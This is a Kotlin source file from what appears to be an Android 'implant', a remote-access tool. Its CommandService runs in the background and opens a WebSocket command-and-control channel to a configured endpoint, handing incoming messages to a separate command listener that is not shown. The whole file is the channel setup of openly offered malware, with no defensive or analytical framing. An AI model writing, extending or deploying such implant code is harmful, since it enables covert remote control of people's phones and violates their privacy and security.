package com.cooperthecoder.implant.command

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.*
import android.util.Log
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.Networking
import okhttp3.*

class CommandService : Service() {

    companion object {
        val TAG = CommandService::class.java.name
        const val SOCKET_CLOSE = 200

        fun start(context: Context) {
            val intent = Intent(context, CommandService::class.java)
            context.startService(intent)
        }
    }

    private lateinit var webSocket: WebSocket


    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Log.d(TAG, "Opening websocket")
        openCommandChannel()
        Log.d(TAG, "Open request dispatched")
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        closeCommandChannel()
        super.onDestroy()
    }

    private fun openCommandChannel() {
        val request = Request.Builder()
                .url(Config.WEBSOCKETS_ENDPOINT)
                .build()
        val commandListener = CommandListener(this)
        webSocket = Networking.httpClient(this).newWebSocket(request, commandListener)
    }


    private fun closeCommandChannel() {
        webSocket.close(SOCKET_CLOSE, null)
    }
}
